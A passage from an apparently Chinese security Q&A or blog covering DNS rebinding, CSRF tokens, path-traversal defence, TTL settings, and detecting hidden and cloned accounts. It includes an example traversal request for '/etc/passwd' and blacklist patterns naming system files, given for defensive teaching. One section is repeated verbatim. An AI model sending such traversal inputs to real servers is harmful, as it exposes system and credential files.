<li><strong>基础设施即代码（IaC）</strong>：使用 <strong>Terraform</strong> 或 <strong>ROS（阿里云）</strong> 等工具，可以快速部署一个干净、已加固的新环境，然后将应用切换过去，这比修复一个受感染的云主机要快得多</li>
</ul>
<hr>
<h3 id="DNS-重绑定漏洞原理"><a href="#DNS-重绑定漏洞原理" class="headerlink" title="DNS 重绑定漏洞原理"></a>DNS 重绑定漏洞原理</h3><p><strong>1. 攻击原理：两次 DNS 解析的“重绑定”</strong></p>
<p>DNS 重绑定攻击的核心在于**“两次”<strong>和</strong>“重绑定”**这两个关键步骤</p>
<p><strong>第一步：第一次 DNS 解析（公网地址）</strong></p>
<ol>
<li><strong>攻击者准备：</strong> 攻击者控制一个恶意域名，例如 <code>rebind.attacker.com</code>，并在其 DNS 服务器上配置该域名</li>
<li><strong>用户访问：</strong> 用户在浏览器中访问一个恶意网站，该网站包含一个加载 <code>rebind.attacker.com</code> 资源的脚本</li>
<li><strong>DNS 解析：</strong> 浏览器向 DNS 服务器请求解析 <code>rebind.attacker.com</code></li>
<li><strong>恶意响应：</strong> 攻击者的 DNS 服务器返回一个正常的<strong>公网 IP 地址</strong>（例如 <code>1.1.1.1</code>）和一个非常短的 **TTL（Time-to-Live）**值，比如 10 秒<ul>
<li><strong>TTL</strong> 是 DNS 记录的有效期，它告诉浏览器在 TTL 时间内可以缓存这个解析结果。很短的 TTL 值是攻击成功的关键</li>
</ul>
</li>
<li><strong>建立信任：</strong> 浏览器接收到公网 IP 后，与 <code>rebind.attacker.com </code>建立连接，加载恶意脚本。此时，浏览器认为该脚本是安全的，因为它来自一个公网域名</li>
</ol>
<p><strong>第二步：第二次DNS解析（内网地址）</strong></p>
<ol>
<li><strong>TTL 过期：</strong> 恶意脚本被加载后，会等待一个比 TTL 值稍长的时间（例如 12 秒）</li>
<li><strong>发起请求：</strong> 脚本向同一个域名 <code>rebind.attacker.com</code> 发起一个新的请求（例如，一个 AJAX 请求）</li>
<li><strong>重新解析：</strong> 由于第一次的 DNS 记录已经过期（TTL 超时），浏览器会再次向 DNS 服务器请求解析<code>rebind.attacker.com</code></li>
<li><strong>重绑定：</strong> 这一次，攻击者的 DNS 服务器不再返回公网 IP，而是返回一个<strong>内网 IP 地址</strong>（例如 <code>192.168.1.1</code>）</li>
<li><strong>绕过策略：</strong> 浏览器接收到这个内网 IP 后，由于它认为这个新的请求仍然来自“同源”的 <code>rebind.attacker.com</code>，而其解析结果却是内网 IP，浏览器会认为该请求是合法的，并将其发送到内网地址<code>192.168.1.1</code></li>
<li><strong>攻击成功：</strong> 此时，恶意脚本已经成功绕过同源策略，可以直接访问和控制内网中的设备，如路由器、摄像头或打印机</li>
</ol>
<hr>
<h3 id="Token-和-Referer-的安全等级谁高"><a href="#Token-和-Referer-的安全等级谁高" class="headerlink" title="Token 和 Referer 的安全等级谁高"></a>Token 和 Referer 的安全等级谁高</h3><p>Token 的安全等级远高于 Referer</p>
<p>以一个简单的比喻来说：</p>
<ul>
<li><strong>Token</strong> 就像一张带有防伪标记和有效期的<strong>银行卡</strong>，只有验证了卡片和密码（以及有效期），才能进行交易</li>
<li><strong>Referer</strong> 就像你告诉收银员你是从哪个商场进来的，这个信息谁都可以随口编造，收银员不会拿这个来验证你的身份。</li>
</ul>
<hr>
<h3 id="任意文件下载漏洞防御方法"><a href="#任意文件下载漏洞防御方法" class="headerlink" title="任意文件下载漏洞防御方法"></a>任意文件下载漏洞防御方法</h3><p><strong>1. 严格校验用户输入</strong></p>
<p>这是最根本也是最重要的防御措施。在处理文件下载请求时，绝对不能相信用户提供的任何文件路径信息</p>
<ul>
<li><strong>白名单机制：</strong> 建议使用<strong>白名单</strong>来限制用户可下载的文件。即只允许下载特定目录下的特定文件。例如，你可以定义一个允许下载的文件列表，当用户请求文件时，先检查请求的文件名是否在白名单中</li>
<li><strong>黑名单机制（不推荐）：</strong> 尽管可以通过黑名单来过滤一些危险的文件名（如<code>../</code>、<code>../../</code>、<code>/etc/passwd</code>、<code>C:/Windows/win.ini</code>），但这种方法很容易被绕过。攻击者可以使用编码（如 URL 编码）或者其他技巧来绕过黑名单，因此不推荐单独使用黑名单</li>
<li><strong>路径规范化：</strong> 在处理用户输入的文件路径前，必须对路径进行规范化。你可以使用编程语言提供的函数来获取文件的规范路径，然后检查这个路径是否在你的下载目录下。例如，在 Python 中可以使用<code>os.path.abspath()</code>来获取绝对路径</li>
<li><strong>禁止使用路径穿越符：</strong> 检查用户输入中是否包含 <code>../</code> 或 <code>..\</code> 等路径穿越符。如果发现，应立即拒绝请求或进行特殊处理</li>
<li><strong>限定下载目录：</strong> 所有可供下载的文件都应存放在一个<strong>专门的、与 Web 根目录隔离</strong>的下载目录中。下载请求应该只允许访问这个目录下的文件</li>
</ul>
<p><strong>2. 权限控制</strong></p>
<ul>
<li><strong>最小权限原则：</strong> Web 服务器（如Nginx、Apache）或运行 Web 应用的账户，应该以<strong>最小权限</strong>运行。不要使用<code>root</code> 或 <code>Administrator</code> 等高权限账户。这样即使出现漏洞，攻击者也无法下载到系统关键文件</li>
<li><strong>文件权限设置：</strong> 确保 Web 目录下的文件权限设置正确。例如，配置文件、日志文件、数据库文件等敏感文件应设置为只有特定用户才能读取，并且禁止 Web 应用账户读取</li>
</ul>
<p><strong>3. 编程实现中的安全实践</strong></p>
<ul>
<li><strong>使用绝对路径：</strong> 在代码中，永远使用<strong>绝对路径</strong>来构建文件下载的路径。不要使用用户提供的相对路径</li>
<li><strong>文件名或 ID 映射：</strong> 更好的一种方法是，不要直接暴露文件名给用户。你可以为每个可下载文件生成一个<strong>唯一的ID</strong>，并将其存储在数据库中。用户请求时，只提供这个 ID，后端程序根据 ID 从数据库中查找对应的文件路径并进行下载。这样可以彻底避免用户直接操纵文件名</li>
</ul>
<p>例如：</p>
<ul>
<li><strong>不安全的方式：</strong> <code>download.php?file=../../etc/passwd</code></li>
<li><strong>安全的方式：</strong> <code>download.php?id=123</code> （ID 123 对应的是一个安全的、预设的文件路径）</li>
</ul>
<p><strong>4. Web 应用防火墙（WAF）</strong></p>
<ul>
<li><strong>部署 WAF：</strong> 在 Web 服务器前部署 Web 应用防火墙（WAF）。WAF 可以帮助你检测和拦截包含路径穿越（Path Traversal）攻击特征的请求，如 <code>../</code>、<code>/etc/passwd</code> 等，从而在请求到达应用服务器前就将其拦截</li>
</ul>
<hr>
<h3 id="怎么修改-TTL-值"><a href="#怎么修改-TTL-值" class="headerlink" title="怎么修改 TTL 值"></a>怎么修改 TTL 值</h3><p><strong>1. 修改操作系统中的默认 TTL 值</strong></p>
<p>在应急响应中，我们有时需要修改操作系统默认的 TTL 值来测试网络路径或规避某些防火墙策略</p>
<p><strong>在 Windows 上</strong></p>
<ol>
<li>打开注册表编辑器：在“运行”中输入 <code>regedit</code> 并回车</li>
<li>导航到以下路径： <code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters</code></li>
<li>在右侧窗格中，右键点击空白处，选择“新建” -&gt; “DWORD (32 位) 值”，将其命名为 <code>DefaultTTL</code></li>
<li>双击 <code>DefaultTTL</code>，选择“十进制”，输入你想要设置的 TTL 值（例如，64、128 或 255）</li>
<li>重启电脑使设置生效</li>
</ol>
<p><strong>在 Linux 上</strong></p>
<ol>
<li>打开终端，编辑 <code>sysctl.conf</code> 文件： <code>sudo nano /etc/sysctl.conf</code></li>
<li>在文件末尾添加或修改以下行： <code>net.ipv4.ip_default_ttl = 64</code> 你可以将 <code>64</code> 修改为你想要的值</li>
<li>保存并退出文件</li>
<li>运行以下命令使配置立即生效： <code>sudo sysctl -p</code></li>
</ol>
<p><strong>2. 修改 DNS 记录的 TTL 值</strong></p>
<p>在应急响应场景中，我们经常需要快速更新 DNS 记录以指向新的服务器或 IP 地址，例如在进行 DNS 切换或故障转移时。这时，DNS 记录的 TTL 值就非常重要</p>
<p><strong>TTL 值越低，DNS 记录的更新就越快，但会增加 DNS 服务器的查询负载</strong></p>
<p><strong>TTL 值越高，DNS 记录的更新就越慢，但可以减少 DNS 服务器的负载</strong></p>
<p><strong>如何修改：</strong></p>
<p>你需要在你的域名注册商或 DNS 服务提供商的管理界面中进行修改</p>
<ol>
<li>登录你的 DNS 服务商（如 GoDaddy, Cloudflare, 阿里云 DNS 等）</li>
<li>找到你想要修改的域名，进入 DNS 记录管理页面</li>
<li>找到对应的 A 记录、CNAME 记录或 MX 记录</li>
<li>你会看到一个 <strong>TTL</strong> 字段，通常以秒为单位。将其修改为你需要的值<ul>
<li><strong>应急场景</strong>：当需要快速切换时，建议将 TTL 值降低到 <strong>60 秒</strong>甚至 <strong>300 秒（5 分钟）</strong></li>
<li><strong>正常运行</strong>：一般情况下，可以设置为 **3600 秒（1 小时）**或 <strong>86400 秒（1 天）</strong></li>
</ul>
</li>
<li>保存修改</li>
</ol>
<hr>
<h3 id="Linux-怎么查看程序调用了哪些文件"><a href="#Linux-怎么查看程序调用了哪些文件" class="headerlink" title="Linux 怎么查看程序调用了哪些文件"></a>Linux 怎么查看程序调用了哪些文件</h3><p><strong>1. 使用 <code>lsof</code> 命令</strong></p>
<p><code>lsof</code> (list open files) 是最强大和最常用的工具，它可以列出当前系统所有打开的文件，包括普通文件、目录、网络套接字等</p>
<p><strong>基本用法：</strong></p>
<p>要查看特定程序（通过 <strong>PID</strong> 或 <strong>进程名</strong>）打开了哪些文件，你可以使用以下命令：</p>
<ul>
<li><p><strong>按进程名查看：</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsof -c &lt;program_name&gt;</span><br></pre></td></tr></table></figure>

<p>例如，要查看 <code>nginx</code> 进程打开了哪些文件，可以运行：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsof -c nginx</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>按进程 ID (PID) 查看：</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsof -p &lt;PID&gt;</span><br></pre></td></tr></table></figure>

<p>首先，你需要找到程序的 PID。比如，使用 <code>ps aux | grep nginx</code> 或 <code>pgrep nginx</code>。然后，用找到的 PID 来查看：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsof -p 12345</span><br></pre></td></tr></table></figure></li>
</ul>
<p><strong>常见输出字段：</strong></p>
<p><code>lsof</code> 的输出通常包含以下列：</p>
<ul>
<li><strong>COMMAND</strong>：命令名</li>
<li><strong>PID</strong>：进程 ID</li>
<li><strong>USER</strong>：用户</li>
<li><strong>FD</strong>：文件描述符 (File Descriptor)<ul>
<li><code>cwd</code>：当前工作目录</li>
<li><code>txt</code>：程序的可执行文件</li>
<li><code>mem</code>：内存映射文件</li>
<li><code>数字</code>：普通文件，后面通常跟着 <code>r</code> (读)、<code>w</code> (写) 或 <code>u</code> (读写)</li>
</ul>
</li>
<li><strong>TYPE</strong>：文件类型（如 <code>REG</code> 表示普通文件，<code>DIR</code> 表示目录）</li>
<li><strong>NAME</strong>：文件名</li>
</ul>
<p><strong>2. 使用 <code>strace</code> 命令</strong></p>
<p><code>strace</code> 工具用于跟踪系统调用和信号。它可以记录程序在运行过程中对文件进行的各种操作，如 <code>open()</code>、<code>read()</code>、<code>write()</code> 等。</p>
<p><strong>基本用法：</strong></p>
<ul>
<li><p><strong>启动时跟踪新程序：</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strace &lt;program_name&gt;</span><br></pre></td></tr></table></figure>

<p>这个命令会启动程序，并实时打印出它所有的系统调用。要只看文件相关的调用，可以使用 <code>-e</code> 选项：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strace -e trace=file &lt;program_name&gt;</span><br></pre></td></tr></table></figure>

<p>或者，更精确地跟踪 <code>open</code> 调用：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strace -e open &lt;program_name&gt;</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>跟踪正在运行的程序：</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strace -p &lt;PID&gt;</span><br></pre></td></tr></table></figure>

<p>这会附加到指定的 PID 上，并开始跟踪其系统调用</p>
</li>
</ul>
<p><code>strace</code> 的输出非常详细，可以帮助你了解程序是如何与文件系统交互的，例如它尝试打开哪个文件、是否成功、返回的文件描述符是什么等等</p>
<p><strong>3. 查看 <code>/proc</code> 文件系统</strong></p>
<p><code>/proc</code> 是一个虚拟文件系统，提供了对内核数据结构的访问。每个正在运行的进程都有一个对应的目录 <code>/proc/&lt;PID&gt;</code></p>
<ul>
<li><p><strong><code>/proc/&lt;PID&gt;/fd/</code> 目录：</strong> 这个目录包含了进程打开的所有文件描述符的符号链接。你可以通过列出这个目录的内容来查看：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span> -l /proc/&lt;PID&gt;/fd/</span><br></pre></td></tr></table></figure>

<p>这个命令会列出所有文件描述符及其指向的真实文件路径</p>
</li>
<li><p><strong><code>/proc/&lt;PID&gt;/exe</code> 文件：</strong> 这是一个指向程序可执行文件的符号链接</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">readlink</span> /proc/&lt;PID&gt;/exe</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong><code>/proc/&lt;PID&gt;/cwd</code> 文件：</strong> 这是一个指向程序当前工作目录的符号链接</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">readlink</span> /proc/&lt;PID&gt;/cwd</span><br></pre></td></tr></table></figure></li>
</ul>
<p><strong>总结</strong></p>
<ul>
<li><strong><code>lsof</code></strong>：最直接、最常用的工具，<strong>可以快速查看</strong>一个程序当前打开了哪些文件。当你想知道“这个程序现在正在使用什么文件？”时，首选 <code>lsof</code></li>
<li><strong><code>strace</code></strong>：用于 <strong>跟踪程序动态行为</strong>。当你想知道“这个程序在运行过程中<strong>尝试</strong>打开或访问了哪些文件？”或者想调试为什么某个文件无法打开时，<code>strace</code> 是最佳选择</li>
<li><strong><code>/proc</code> 文件系统</strong>：这是一个 <strong>低级</strong> 的方法，提供了对进程状态的直接访问。当你无法使用 <code>lsof</code> 或 <code>strace</code> 时，或者需要编写脚本来获取信息时，<code>/proc</code> 是一个可靠的备选方案</li>
</ul>
<p>通常情况下，<strong><code>lsof -c &lt;program_name&gt;</code></strong> 是解决大多数问题的起点，因为它简单、直接且输出清晰</p>
<hr>
<h3 id="CMD-命令行如何查询远程终端开放端口"><a href="#CMD-命令行如何查询远程终端开放端口" class="headerlink" title="CMD 命令行如何查询远程终端开放端口"></a>CMD 命令行如何查询远程终端开放端口</h3><p><strong>1. 使用 <code>netstat -ano</code> 找到可疑的端口和对应的 PID</strong></p>
<p>运行 <code>netstat -ano</code> 后，你会看到一个详细的列表，包含：</p>
<ul>
<li><strong>协议 (Proto)</strong>: TCP 或 UDP</li>
<li><strong>本地地址 (Local Address)</strong>: 本地IP地址和端口号</li>
<li><strong>外部地址 (Foreign Address)</strong>: 远程IP地址和端口号</li>
<li><strong>状态 (State)</strong>: 连接状态，例如 <code>ESTABLISHED</code> (已建立连接)、<code>LISTENING</code> (正在监听)</li>
<li><strong>PID</strong>: 进程 ID</li>
</ul>
<p>你可以通过查找 <code>LISTENING</code> 状态的端口，或者 <code>ESTABLISHED</code> 状态的陌生外部地址，来定位可疑的网络活动</p>
<hr>
<h3 id="CMD-命令行如何查询远程终端开放端口-1"><a href="#CMD-命令行如何查询远程终端开放端口-1" class="headerlink" title="CMD 命令行如何查询远程终端开放端口"></a>CMD 命令行如何查询远程终端开放端口</h3><p><strong>1. 使用 <code>netstat -ano</code> 找到可疑的端口和对应的 PID</strong></p>
<p>运行 <code>netstat -ano</code> 后，你会看到一个详细的列表，包含：</p>
<ul>
<li><strong>协议 (Proto)</strong>: TCP 或 UDP</li>
<li><strong>本地地址 (Local Address)</strong>: 本地IP地址和端口号</li>
<li><strong>外部地址 (Foreign Address)</strong>: 远程IP地址和端口号</li>
<li><strong>状态 (State)</strong>: 连接状态，例如 <code>ESTABLISHED</code> (已建立连接)、<code>LISTENING</code> (正在监听)</li>
<li><strong>PID</strong>: 进程 ID</li>
</ul>
<p>你可以通过查找 <code>LISTENING</code> 状态的端口，或者 <code>ESTABLISHED</code> 状态的陌生外部地址，来定位可疑的网络活动</p>
<hr>
<h3 id="查看服务器是否存在可疑账号、新增账号"><a href="#查看服务器是否存在可疑账号、新增账号" class="headerlink" title="查看服务器是否存在可疑账号、新增账号"></a>查看服务器是否存在可疑账号、新增账号</h3><p><strong>Windows 服务器排查</strong></p>
<p>在 Windows 系统中，我们可以通过命令行工具、注册表和日志来查找异常账号</p>
<p><strong>1. 使用命令行检查</strong></p>
<ul>
<li><p><strong>查看本地所有用户账号</strong> 使用 <code>net user</code> 命令可以列出系统上的所有本地用户。仔细检查是否有不认识或命名异常的账号，例如：<code>tempadmin</code>、<code>testuser</code>、<code>service_a</code> 等</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>查看新增的管理员账号</strong> 使用以下命令可以查看本地管理员组的成员。如果发现新的或不熟悉的账号，需要重点排查</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net localgroup administrators</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>查看最近创建的账号</strong> <code>lusrmgr.msc</code>（本地用户和组）是一个图形化界面，可以按创建日期排序。在命令行中，我们通常需要结合 <strong>安全日志</strong> 来进行排查</p>
</li>
</ul>
<p><strong>2. 检查安全事件日志</strong></p>
<p>这是最可靠的方法之一。Windows 会记录用户创建、修改和删除等操作到安全事件日志中</p>
<ul>
<li><p><strong>事件查看器（Event Viewer）</strong></p>
<ol>
<li>打开事件查看器 (<code>eventvwr.msc</code>)</li>
<li>导航到“Windows 日志” -&gt; “安全”</li>
<li>使用“筛选当前日志”功能，输入以下<strong>事件 ID</strong> 进行筛选：<ul>
<li><strong>4720</strong>: 创建用户账号</li>
<li><strong>4722</strong>: 启用用户账号</li>
<li><strong>4724</strong>: 重置用户密码</li>
<li><strong>4732</strong>: 将用户添加到本地安全组（如管理员组）</li>
<li><strong>4728</strong>: 将用户添加到全局安全组</li>
</ul>
</li>
</ol>
<p>通过筛选这些事件 ID，你可以快速定位到账号被创建、启用或权限提升的时间点，并查看操作者（通常是 SYSTEM 或其他管理员账号）</p>
</li>
</ul>
<p><strong>Linux 服务器排查</strong></p>
<p>在 Linux 系统中，我们可以通过检查系统文件和命令历史来发现异常账号</p>
<p><strong>1. 检查关键系统文件</strong></p>
<ul>
<li><p><strong><code>/etc/passwd</code> 文件</strong> 这个文件包含了系统上所有用户的信息，每行代表一个用户。通常，系统的服务账号会以 <code>/sbin/nologin</code> 或 <code>/bin/false</code> 结尾，而可登录的用户通常以 <code>/bin/bash</code> 或 <code>/bin/sh</code> 结尾。 你可以使用 <code>cat</code> 或 <code>less</code> 命令查看，重点关注 UID（用户 ID），UID 小于 1000 的通常是系统账号，而 UID 大于 1000 的是普通用户</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /etc/passwd</span><br></pre></td></tr></table></figure>

<p>要找到 UID 大于 1000 的账号，可以使用：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">awk -F: <span class="string">&#x27;$3 &gt;= 1000 &#123;print $1&#125;&#x27;</span> /etc/passwd</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong><code>/etc/shadow</code> 文件</strong> 这个文件包含了用户的密码哈希值和密码过期信息。虽然不能直接看到密码，但它能确认用户的存在</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /etc/shadow</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong><code>/etc/group</code> 文件</strong> 这个文件定义了用户组。你可以检查 <code>sudo</code>、<code>wheel</code> 或 <code>root</code> 等特权组，看是否有可疑用户被添加</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /etc/group</span><br></pre></td></tr></table></figure></li>
</ul>
<p><strong>2. 查看登录历史和命令历史</strong></p>
<ul>
<li><p><strong>查看用户登录历史</strong> 使用 <code>last</code> 命令可以查看所有用户的登录历史。检查是否有不正常的登录时间、来源 IP 地址或登录用户。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">last</span><br></pre></td></tr></table></figure>

<p>使用 <code>who</code> 命令可以查看当前登录的用户</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">who</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>查看命令历史</strong> 检查 <code>/root/.bash_history</code> 或 <code>/home/&lt;username&gt;/.bash_history</code> 文件，看是否有添加用户的命令（如 <code>useradd</code>）</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /root/.bash_history | grep <span class="string">&quot;useradd&quot;</span></span><br></pre></td></tr></table></figure>

<p><strong>注意</strong>：攻击者可能会清除命令历史，所以这不能作为唯一的判断依据</p>
</li>
</ul>
<p><strong>3. 检查审计日志（Auditd）</strong></p>
<p>如果你的 Linux 服务器配置了 <code>auditd</code> 服务，那你可以通过审计日志来获取更详细的信息。<code>auditd</code> 会记录系统上几乎所有的操作</p>
<ul>
<li><p><strong>事件 ID</strong> <code>auditd</code> 记录用户创建的事件 ID 是 <strong>1000</strong>。你可以通过 <code>ausearch</code> 命令来查询：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ausearch -ua root -i | grep 1000</span><br></pre></td></tr></table></figure>

<p>这个命令可以帮助你查找由 root 用户执行的账户创建操作</p>
<hr>
<h3 id="查看服务器是否存在隐藏账号、克隆账号"><a href="#查看服务器是否存在隐藏账号、克隆账号" class="headerlink" title="查看服务器是否存在隐藏账号、克隆账号"></a>查看服务器是否存在隐藏账号、克隆账号</h3></li>
</ul>
<p><strong>Windows 服务器排查</strong></p>
<p>攻击者在 Windows 上克隆或隐藏账户通常利用注册表和用户 SID（安全标识符）的特性。</p>
<p><strong>1. 排查克隆账户</strong></p>
<p>克隆账户是指攻击者创建一个新的用户，然后修改注册表，使其拥有与某个高权限账户（如管理员）完全相同的 SID 和权限，但名字可能正常或看似无害</p>
<ul>
<li><p><strong>使用 <code>wmic</code> 命令检查</strong> 使用 <code>wmic useraccount</code> 命令可以列出所有用户及其 SID。你需要重点检查以下情况：</p>
<ol>
<li><strong>SID 异常</strong>：正常用户的 SID 最后一位通常是 1000 以上的递增数字</li>
<li><strong>用户与 SID 不匹配</strong>：特别是那些用户名看起来正常，但 SID 和其他用户（如管理员）完全相同的账户</li>
</ol>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic useraccount get name,sid</span><br></pre></td></tr></table></figure>

<p>正常情况下，一个用户对应一个唯一的 SID。如果发现两个用户拥有相同的 SID，则很可能存在克隆账户</p>
</li>
<li><p><strong>检查本地用户和组</strong> 虽然在 <code>lusrmgr.msc</code> 中通常能看到克隆账户，但有时候攻击者会用一些技巧隐藏，所以结合 <code>wmic</code> 检查更保险。</p>
</li>
</ul>
<p><strong>2. 排查隐藏账户</strong></p>
<p>攻击者会通过修改注册表来隐藏账户，使其在 <code>net user</code> 或 <code>lusrmgr.msc</code> 中不显示</p>
<ul>
<li><p><strong>检查注册表</strong></p>
<ol>
<li><p>打开注册表编辑器：<code>regedit</code></p>
</li>
<li><p>导航到：<code>HKEY_LOCAL_MACHINE\SAM\SAM</code></p>
</li>
<li><p>你需要 SYSTEM 权限才能访问这个路径。可以通过 <code>psexec</code> 获取一个 SYSTEM 权限的 <code>cmd</code> 来进行查看：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">psexec -s -i cmd</span><br></pre></td></tr></table></figure>
</li>
<li><p>在 SYSTEM 权限的 <code>cmd</code> 中再次打开 <code>regedit</code>，导航到该路径</p>
</li>
<li><p>你会在 <code>SAM\Domains\Account\Users\Names</code> 下看到所有账户名</p>
</li>
<li><p>在 <code>SAM\Domains\Account\Users</code> 下，每个子项代表一个账户，其名称是十六进制的 RVA（相对虚拟地址）</p>
</li>
<li><p><strong>对比 <code>Users\Names</code> 和 <code>Users</code> 下的键值。</strong> 如果 <code>Users</code> 下存在某个键值（账户）但在 <code>Users\Names</code> 下没有对应的名称，那么这个账户就是隐藏账户</p>
</li>
</ol>
</li>
<li><p><strong>日志审计</strong> 结合 <strong>安全日志</strong>（事件 ID 4720）进行排查，即使账户被隐藏，其创建记录也可能被保留</p>
</li>
</ul>
<p><strong>Linux 服务器排查</strong></p>
<p>在 Linux 上，隐藏账户通常是利用系统文件的特性，而克隆账户则相对少见，但可以通过其他方式实现权限提升</p>
<p><strong>1. 排查隐藏账户</strong></p>
<p>攻击者通常通过修改 <code>/etc/passwd</code> 和 <code>/etc/shadow</code> 文件，删除用户名，但保留账户的其他信息，或者创建没有名称的账户</p>
<ul>
<li><p><strong>检查 <code>/etc/passwd</code> 文件</strong></p>
<ol>
<li><p>查找没有用户名的账户：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep -v <span class="string">&#x27;^[a-zA-Z]&#x27;</span> /etc/passwd</span><br></pre></td></tr></table></figure>

<p>这个命令会过滤掉所有以字母开头的行，如果输出结果有非空的行，可能存在隐藏账户</p>
</li>
<li><p>查找空用户名账户：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /etc/passwd | awk -F: <span class="string">&#x27;($1 == &quot;&quot;) &#123; print &#125;&#x27;</span></span><br></pre></td></tr></table></figure>

<p>这种方法可以查找用户名为空的账户</p>
</li>
<li><p>检查 UID 为 0 的账户：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">awk -F: <span class="string">&#x27;($3 == 0) &#123; print &#125;&#x27;</span> /etc/passwd</span><br></pre></td></tr></table></figure>

<p>UID 为 0 的账户拥有 root 权限。理论上只有一个 root 账户的 UID 为 0，如果出现多个，则很可能是克隆账户</p>
</li>
</ol>
</li>
</ul>
<p><strong>2. 检查克隆账户</strong></p>
<p>Linux 上的克隆账户通常是指多个账户拥有相同的 UID，从而共享相同的权限</p>
<ul>
<li><p><strong>检查相同 UID 的账户</strong> 使用 <code>awk</code> 命令查找 UID 重复的账户，这通常是克隆 root 权限账户的迹象</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">awk -F: <span class="string">&#x27;&#123;print $3&#125;&#x27;</span> /etc/passwd | <span class="built_in">sort</span> | <span class="built_in">uniq</span> -d</span><br></pre></td></tr></table></figure>

<p>这个命令会找出 <code>/etc/passwd</code> 文件中所有重复的 UID。如果输出结果有 0，说明存在多个 UID 为 0 的账户。然后，你可以用 <code>grep</code> 查找这些 UID 对应的用户名</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep <span class="string">&quot;:0:&quot;</span> /etc/passwd</span><br></pre></td></tr></table></figure></li>
</ul>
<p><strong>3. 检查 SSH 授权文件</strong></p>
<p>攻击者也可能通过在 <code>.ssh/authorized_keys</code> 中添加公钥来持久化，从而无需密码即可登录</p>
<ul>
<li><p><strong>检查所有用户的 <code>.ssh</code> 目录</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find /home -name <span class="string">&quot;authorized_keys&quot;</span></span><br></pre></td></tr></table></figure>

<p>找到文件后，检查其内容，看是否有不认识的公钥</p>
<hr>
<h3 id="SQL-注入用转义字符防御时，如果遇到数据库的列名或是表名本身就带着特殊字符怎么办"><a href="#SQL-注入用转义字符防御时，如果遇到数据库的列名或是表名本身就带着特殊字符怎么办" class="headerlink" title="SQL 注入用转义字符防御时，如果遇到数据库的列名或是表名本身就带着特殊字符怎么办"></a>SQL 注入用转义字符防御时，如果遇到数据库的列名或是表名本身就带着特殊字符怎么办</h3></li>
</ul>
<p>在这种情况下，<strong>不应该</strong>对这些数据库对象名称使用转义字符，因为它们是数据库的合法标识符，而不是用户输入的数据。如果进行了转义，数据库将无法正确识别这些对象</p>
<p><strong>正确的做法：使用反引号或双引号进行引用</strong></p>
